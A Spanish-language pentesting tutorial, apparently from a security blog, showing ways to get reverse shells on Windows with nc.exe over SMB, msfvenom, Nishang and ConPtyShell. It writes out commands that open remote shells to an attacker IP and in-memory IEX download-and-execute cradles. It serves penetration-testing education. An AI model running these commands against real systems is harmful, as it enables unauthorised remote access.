---
id: "maneras-de-ejecutar-reverse-shells-en-windows"
title: "Maneras de ejecutar Reverse Shells en Windows"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-01-24
updatedDate: 2022-01-24
image: "https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-0.webp"
description: "Guía completa sobre las principales formas de obtener reverse shells en Windows usando nc.exe, msfvenom, PowerShell one-liners, Nishang y ConPtyShell, incluyendo técnicas para shells interactivas y consideraciones sobre arquitecturas de 32 y 64 bits."
categories:
  - "windows"
draft: false
featured: false
lang: "es"
---

Cuando recién entramos a aprender pentesting a sistemas Windows, la primera diferencia que nos podemos encontrar es como obtener una reverse shell. Por lo que en este post vamos a ver las principales formas de obtener una.

- [Nc.exe](#ncexe)
- [Msfvenom](#msfvenom)
- [Powershell Reverse Shell One-Liner](#powershell-reverse-shell-one-liner)
- [Nishang](#nishang)
- [ConPtyShell](#conptyshell)
- [Ver si nuestro proceso es de 32 o 64 bits](#ver-si-nuestro-proceso-es-de-32-o-64-bits)
- [Referencias](#referencias)

## Nc.exe

Al igual que tenemos netcat en Linux y sus respectivos binarios para ese sistema, existen los binarios respectivos para Windows, tanto de 32 bits (`nc.exe`) como de 64 bits (`nc64.exe`), se pueden descargar desde el [repositorio int0x33/nc.exe en GitHub](https://github.com/int0x33/nc.exe/).

En este caso, podemos además de descargarlo y ejecutarlo, ejecutarlo directamente desde un recurso compartido que nosotros nos montemos (esto lo comento como alternativa a la descarga de un ejecutable).

La sintaxis del `nc.exe` sería la siguiente:

`nc.exe -e cmd.exe <ip> <puerto>`

Desde nuestro Kali, nos ponemos en escucha:

![Configuración de netcat listener con rlwrap para mejorar la shell de Windows](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-1.avif)

> Nota: `rlwrap` es una utilidad que nos mejora un poco la movilidad en shells Windows, ya que estas suelen ser muy limitadas en cuanto a movilidad se refiere (también se podría usar en scripts o programas que tengan o generen una shell interactiva interna). Rlwrap permite que podamos usar atajos de teclado como Ctrl L, o que podamos recuperar comandos previamente usados usando la tecla de la flechita hacia arriba (Sin embargo, si hacemos Ctrl C perderemos la shell).
> 
> En conclusión, siempre que nos pongamos en escucha para recibir una shell de Windows, es muy recomendable usar `rlwrap`.

Antes de montar el servidor SMB que vaya a compartir nuestro `nc.exe`, tenemos que copiarnos el `nc.exe` a nuestro directorio o montar el servidor donde se encuentre el `nc.exe`. En mi caso, por simple preferencia, me copio el `nc.exe` a mi directorio actual:

![Copia del binario nc.exe al directorio actual](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-2.avif)

Con esto hecho, montamos el servidor SMB en nuestra ruta actual usando el script `smbserver.py` de impacket, con la siguiente estructura:

`smbserver.py <nombre del recurso compartido> <directorio donde montar el servidor> -smb2support`

> Nota: el parámetro `smb2support` solo es necesario si el Windows no admite la versión 1 de SMB.

![Servidor SMB montado con impacket compartiendo nc.exe](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-3.avif)

Con el servidor SMB montado en el lugar del `nc.exe` y con el puerto en escucha, simplemente ejecutamos en el Windows el comando que puse al principio de netcat al mismo tiempo que indicamos que el binario se encuentra en el recurso compartido con nombre "pwned":

`\\192.168.118.10\pwned\nc.exe -e cmd.exe <ip> <puerto>`

![Ejecución de nc.exe desde recurso compartido SMB en Windows](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-4.avif)

De esta forma, podemos ver el acceso a nuestro servidor SMB y la shell obtenida:

![Reverse shell recibida desde Windows mediante nc.exe](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-5.avif)

## Msfvenom

Msfvenom no solo es útil cuando nos generamos shellcodes para los Buffer Overflow, también lo es para crear binarios que nos ejecuten una shell en Windows. En concreto, los dos payloads que nos pueden interesar (aunque hay más y de muchos tipos) son los siguientes:

![Listado de payloads de msfvenom para Windows reverse shell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-6.avif)

En este caso, usaremos el segundo, ya que mi Windows se trata de uno de 64 bits. Por lo que podemos generar un ejecutable con el siguiente comando:

`msfvenom -p <payload> LHOST=<ip> LPORT=<puerto> -a x<arquitectura> -f exe -o shell.exe`

> Nota: en este comando no estamos usando ningún encoder, se le podría agregar uno

![Generación de payload ejecutable con msfvenom para Windows x64](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-7.avif)

Este ejecutable lo pasamos a la máquina víctima y lo ejecutamos:

![Ejecución del payload generado con msfvenom en Windows](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-8.avif)

Recibiendo así, una shell:

![Reverse shell recibida mediante payload de msfvenom](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-9.avif)

## Powershell Reverse Shell One-Liner

PowerShell es un lenguaje muy potente y permite hacer muchísimas cosas, veremos scripts muy útiles después. Pero antes de ir a ellos, está bien saber que existe una sentencia de PowerShell la cual nos entabla una reverse shell y todo en un comando de una sola línea.

El comando en cuestión lo podéis encontrar en el [gist de PowerShell reverse shell one-liner por Nikhil SamratAshok Mittal](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3).

Personalmente, no recomiendo mucho esta forma, al menos, una ejecución directa, ya que, como podemos ver, es un comando el cual contiene muchísimos símbolos y muchas variables, lo cual puede dificultar su ejecución desde una webshell o una cmd, lo recomendable es ejecutarlo desde una PowerShell directamente.

En cualquier caso, siempre hay que conocer alternativas y opciones disponibles. Por lo que una vez dicho esto, procedemos con la ejecución, que es bastante sencilla, simplemente tenemos que cambiar la IP y el puerto del comando original:

![PowerShell reverse shell one-liner con IP y puerto configurados](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-10.avif)

Ejecutando el comando de arriba obtenemos una shell sin problemas:

![Reverse shell recibida mediante PowerShell one-liner](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-11.avif)

Lo único a tener en cuenta es lo que he dicho antes. Yo por preferencia, casi nunca uso esta forma.

## Nishang

Nishang es un repositorio el cual contiene una gran cantidad de scripts de PowerShell usados para la seguridad ofensiva. Su repositorio oficial es el [repositorio samratashok/nishang en GitHub](https://github.com/samratashok/nishang).

Entre todos los scripts que tiene, hay uno en concreto bastante famoso llamado [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), el cual, como no, nos invoca una reverse shell con una PowerShell.

![Función Invoke-PowerShellTcp del script Nishang](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-12.avif)

Como vemos, el script no es más que una función en PowerShell, por lo que tenemos dos opciones:

- Descargar y cargar el script de forma local, y posteriormente ejecutar la función con los argumentos para una reverse shell.
- Cargar el script de forma remota y que en la misma acción donde lo carga, posteriormente ejecute la función con los argumentos para la reverse shell, todo en un paso.

Vamos a hacerlo de la segunda forma, por lo que vamos a descargar el script desde el repositorio oficial:

![Descarga del script Invoke-PowerShellTcp.ps1 con wget](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-13.avif)

![Contenido del script Invoke-PowerShellTcp mostrando la función](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-14.avif)

En el script podemos ver el comando a ejecutar para que nos haga una reverse shell. Por lo que la idea es copiarnos el comando y añadirlo (con nuestra IP y puerto) al final del script:

![Script Nishang modificado con llamada a función al final](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-15.avif)

De esta forma, justo cuando cargue el script en la PowerShell el cual contiene la función (cmdlet), llamará a la propia función con los argumentos para una reverse shell y la ejecutará.

Ahora bien, para cargar el script en la PowerShell desde una fuente remota y ejecutarlo, usaremos el siguiente comando:

`IEX(New-Object Net.WebClient).DownloadString(<archivo alojado en servidor web>)`

Como nos ejecutará la reverse shell directamente, nos ponemos en escucha ya, al mismo tiempo que nos ejecutamos un servidor HTTP con Python que nos aloje el script:

![Listener en escucha y servidor HTTP con Python sirviendo el script](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-16.avif)

Con esto hecho, ejecutamos el comando `IEX` (Abreviatura de `Invoke-Expression`) en el Windows:

![Ejecución de IEX para cargar y ejecutar script Nishang remotamente](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-17.avif)

De esta forma, podemos ver la petición GET en el servidor y la shell que hemos obtenido:

![Petición HTTP al servidor y reverse shell recibida con Nishang](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-18.avif)

Todo en un mismo paso, además, haciéndolo todo en memoria, ya que el script no se almacena en el disco duro del Windows.

## ConPtyShell

ConPtyShell es una herramienta la cual nos permite obtener una shell completamente interactiva en sistemas Windows. Esto quiere decir que podemos hacer Ctrl C sin peligro a perder la shell o podemos recuperar comandos usados previamente usando la flechita hacia arriba. Su repositorio oficial lo podéis encontrar en el [repositorio antonioCoco/ConPtyShell en GitHub](https://github.com/antonioCoco/ConPtyShell).

El proceso para ejecutarlo prácticamente va a ser el mismo que con el script de Nishang, ya que este se trata de otro script de PowerShell.

Por lo que empezamos descargando el script del repositorio:

![Descarga del script ConPtyShell con wget](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-19.avif)

![Contenido del script ConPtyShell mostrando la función](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-20.avif)

Al igual que antes, no es más que una función de PowerShell a la que tendremos que llamar una vez la hemos importado.

Tenemos de nuevo las mismas opciones de antes, añadir al final del script el comando, o ejecutarlo posterior a la importación del script en la PowerShell. Esta vez lo haremos de la segunda.

Antes de nada, en el repositorio oficial, podemos ver como se nos indican 3 métodos para entablarnos la reverse shell, en mi caso usaré el método 2:

![Métodos de uso de ConPtyShell según documentación oficial](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-21.avif)

El comando con el que descargaremos e importaremos el script también lo cambiaremos para tener siempre otra alternativa, en este caso, usaré el mismo que se indica en el repositorio:

`IEX(IWR -UseBasicParsing <servidor web donde se encuentre el script>)`

Este comando, lo concatenaremos con:

`; Invoke-ConPtyShell -RemoteIp <IP> -RemotePort <puerto> -Rows <nº filas> -Cols <nº columnas>`

Esto sería la parte del cliente (Windows), antes de realizarlo, tenemos que establecer la escucha por parte del servidor (nuestra máquina). Para ello, seguimos los mismos pasos que se nos indica en la imagen del repositorio:

![Configuración del listener con stty para ConPtyShell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-22.avif)

Con el primer comando estamos viendo el tamaño de nuestra terminal (`<filas> <columnas>`). Esta información es la que tendremos que colocar en el comando que ejecutaremos desde el Windows.

Estando ya en escucha, no olvidemos montarnos un servidor HTTP que comparta el script:

![Servidor HTTP con Python y listener en escucha para ConPtyShell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-23.avif)

Con todo listo, ejecutamos el comando en el Windows:

![Ejecución de comando IEX para cargar ConPtyShell remotamente](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-24.avif)

![Conexión recibida de ConPtyShell en el listener](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-25.avif)

En la shell recibida, damos enter para que podamos ver el prompt:

![Prompt de ConPtyShell después de presionar Enter](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-26.avif)

Ahora solo falta hacer lo siguiente:

- `Ctrl Z`
- `stty raw -echo; fg`
- `Enter`

![Ejecución de comandos para hacer la shell completamente interactiva](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-27.avif)

![Shell completamente interactiva de Windows con ConPtyShell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-28.avif)

De esta forma, conseguimos una shell completamente interactiva en Windows.

## Ver si nuestro proceso es de 32 o 64 bits

En las escaladas de privilegios en Windows, tenemos que tener mucho cuidado en la arquitectura en la que esté trabajando el proceso de nuestra shell. En un sistema de 32 bits, la única opción es que nuestra shell sea de 32 bits, ahí guay.

Sin embargo, en un sistema de 64 bits, el proceso de nuestra shell, puede ser de 32 o 64. Lo que ocurre, es que enumerar y escalar privilegios en un proceso de 32 bits cuando la máquina es de 64 no es lo más óptimo, ya que nos puede arrojar muchos falsos positivos o incluso que no consigamos detectar la forma de escalar privilegios solo por este detalle. Esto no ocurre siempre, puede que no tengamos ningún impedimento, pero puede ocurrir que sí lo tengamos. Un buen ejemplo es lo que ocurre en el artículo de [Passwords - Privilege Escalation en Windows](https://blog.deephacking.tech/es/posts/escalada-de-privilegios-a-traves-de-contrase%C3%B1as-en-windows/#registro).

Así que siempre es muy recomendable cuando la máquina es de 64 bits, comprobar si nuestra shell también lo es, o si de lo contrario, es de 32 bits. Esto lo podemos mirar revisando la variable de entorno `%PROCESSOR_ARCHITECTURE%`. Ejemplo:

![Comparación de arquitectura de proceso entre nc64.exe y nc.exe](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-29.avif)

Ambas shells son de la misma máquina, sin embargo, para obtenerlas, en la superior usé `nc64.exe` y en la inferior `nc.exe`.

En PowerShell también podemos comprobar los bits del proceso y sistema operativo con los comandos:

- `[Environment]::Is64BitProcess`
- `[Environment]::Is64BitOperatingSystem`

> Nota: en el sistema, podemos encontrar distintos ejecutables de PowerShell. Algunos de 32 bits y otros de 64. Puede que cuando ejecutemos `powershell.exe` de forma relativa, se nos esté llamando al ejecutable de 32 bits. Por lo que, para asegurarnos de a que PowerShell estamos llamando, podemos hacer uso de la ruta absoluta, donde, por regla general, será de la siguiente forma:
> 
> - `C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe` (64 bits)
> - `C:\Windows\SysWoW64\WindowsPowerShell\v1.0\powershell.exe` (32 bits)
> - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (32 bits)

Teniendo en cuenta esto último, así podremos asegurarnos de que la PowerShell sea de 32 o 64 bits cuando la llamemos para ejecutar un comando o para mandarla por netcat:

Ejemplo de cómo quedaría al mandar por netcat una PowerShell de 64 bits:

`nc.exe -e C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe 192.168.118.10 443`

Siguiendo todo lo explicado, podemos identificar los bits del proceso de nuestra shell y como controlar cuál nos conviene.

## Referencias

- [Repositorio nc.exe en GitHub](https://github.com/int0x33/nc.exe/)
- [PowerShell reverse shell one-liner por Nikhil SamratAshok Mittal](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) [@samratashok](https://github.com/samratashok)
- [Repositorio Nishang en GitHub](https://github.com/samratashok/nishang)
- [Repositorio ConPtyShell en GitHub](https://github.com/antonioCoco/ConPtyShell)
- [Por qué %processor_architecture% siempre retorna x86 en vez de AMD64 - Stack Overflow](https://stackoverflow.com/questions/1738985/why-processor-architecture-always-returns-x86-instead-of-amd64)
- [Determinar si el proceso de PowerShell es de 32-bit o 64-bit - Stack Overflow](https://stackoverflow.com/questions/8588960/determine-if-current-powershell-process-is-32-bit-or-64-bit)
- [Cómo lanzar PowerShell de 64-bit desde cmd.exe de 32-bit - Stack Overflow](https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe)
